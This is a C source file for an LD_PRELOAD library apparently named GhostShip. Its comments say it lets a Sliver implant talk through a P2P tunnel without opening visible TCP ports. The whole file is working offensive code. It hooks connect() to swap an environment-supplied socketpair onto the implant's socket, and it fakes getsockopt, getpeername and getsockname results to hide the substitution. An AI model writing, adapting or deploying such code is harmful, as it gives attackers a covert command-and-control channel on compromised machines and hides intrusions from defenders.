/*
 * GhostShip LD_PRELOAD Hook
 *
 * Intercepts connect() calls and redirects connections to 127.0.0.1:8888
 * to use the socketpair fd passed via SLIVER_PIPE_FD environment variable.
 *
 * This allows Sliver implant to communicate through the P2P tunnel
 * without opening any visible TCP ports.
 *
 * Compile: gcc -shared -fPIC -o libgshook.so gshook.c -ldl
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

/* Target address to intercept */
#define TARGET_IP   "127.0.0.1"
#define TARGET_PORT 8888

/* Original connect function pointer */
static int (*real_connect)(int, const struct sockaddr *, socklen_t) = NULL;

/* Get the pipe fd from environment */
static int get_pipe_fd(void) {
    const char *fd_str = getenv("SLIVER_PIPE_FD");
    if (fd_str == NULL) {
        return -1;
    }
    return atoi(fd_str);
}

/* Check if address matches our target */
static int is_target_address(const struct sockaddr *addr) {
    if (addr->sa_family != AF_INET) {
        return 0;
    }

    const struct sockaddr_in *addr_in = (const struct sockaddr_in *)addr;

    /* Check port (network byte order) */
    if (ntohs(addr_in->sin_port) != TARGET_PORT) {
        return 0;
    }

    /* Check IP */
    char ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &addr_in->sin_addr, ip_str, sizeof(ip_str));

    if (strcmp(ip_str, TARGET_IP) != 0) {
        return 0;
    }

    return 1;
}

/* Hooked connect function */
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    /* Load real connect if not already loaded */
    if (real_connect == NULL) {
        real_connect = dlsym(RTLD_NEXT, "connect");
        if (real_connect == NULL) {
            errno = ENOSYS;
            return -1;
        }
    }

    /* Check if this is our target address */
    if (is_target_address(addr)) {
        int pipe_fd = get_pipe_fd();

        if (pipe_fd < 0) {
            /* No pipe fd available, fall through to real connect */
            return real_connect(sockfd, addr, addrlen);
        }

        /*
         * Redirect: duplicate the pipe fd onto the socket fd.
         * This makes Sliver think it connected to TCP, but actually
         * it's writing to our socketpair.
         */
        if (dup2(pipe_fd, sockfd) < 0) {
            return -1;
        }

        /* Success - Sliver now talks through the pipe */
        return 0;
    }

    /* Not our target, use real connect */
    return real_connect(sockfd, addr, addrlen);
}

/*
 * Also hook socket() to handle cases where Sliver might check
 * socket options that don't apply to pipes
 */
static int (*real_getsockopt)(int, int, int, void *, socklen_t *) = NULL;

int getsockopt(int sockfd, int level, int optname, void *optval, socklen_t *optlen) {
    if (real_getsockopt == NULL) {
        real_getsockopt = dlsym(RTLD_NEXT, "getsockopt");
        if (real_getsockopt == NULL) {
            errno = ENOSYS;
            return -1;
        }
    }

    /*
     * If this fd is our pipe, return success for common socket options
     * that Sliver might check (like SO_ERROR after connect)
     */
    int pipe_fd = get_pipe_fd();
    if (pipe_fd >= 0 && sockfd == pipe_fd) {
        if (level == SOL_SOCKET && optname == SO_ERROR) {
            if (optval != NULL && optlen != NULL && *optlen >= sizeof(int)) {
                *((int *)optval) = 0;  /* No error */
                *optlen = sizeof(int);
                return 0;
            }
        }
    }

    return real_getsockopt(sockfd, level, optname, optval, optlen);
}

/*
 * Hook getpeername to return fake peer address for our pipe
 */
static int (*real_getpeername)(int, struct sockaddr *, socklen_t *) = NULL;

int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    if (real_getpeername == NULL) {
        real_getpeername = dlsym(RTLD_NEXT, "getpeername");
        if (real_getpeername == NULL) {
            errno = ENOSYS;
            return -1;
        }
    }

    int pipe_fd = get_pipe_fd();
    if (pipe_fd >= 0 && sockfd == pipe_fd) {
        /* Return fake peer address */
        if (addr != NULL && addrlen != NULL && *addrlen >= sizeof(struct sockaddr_in)) {
            struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
            addr_in->sin_family = AF_INET;
            addr_in->sin_port = htons(TARGET_PORT);
            inet_pton(AF_INET, TARGET_IP, &addr_in->sin_addr);
            *addrlen = sizeof(struct sockaddr_in);
            return 0;
        }
    }

    return real_getpeername(sockfd, addr, addrlen);
}

/*
 * Hook getsockname similarly
 */
static int (*real_getsockname)(int, struct sockaddr *, socklen_t *) = NULL;

int getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    if (real_getsockname == NULL) {
        real_getsockname = dlsym(RTLD_NEXT, "getsockname");
        if (real_getsockname == NULL) {
            errno = ENOSYS;
            return -1;
        }
    }

    int pipe_fd = get_pipe_fd();
    if (pipe_fd >= 0 && sockfd == pipe_fd) {
        /* Return fake local address */
        if (addr != NULL && addrlen != NULL && *addrlen >= sizeof(struct sockaddr_in)) {
            struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
            addr_in->sin_family = AF_INET;
            addr_in->sin_port = htons(0);  /* Ephemeral port */
            inet_pton(AF_INET, "127.0.0.1", &addr_in->sin_addr);
            *addrlen = sizeof(struct sockaddr_in);
            return 0;
        }
    }

    return real_getsockname(sockfd, addr, addrlen);
}
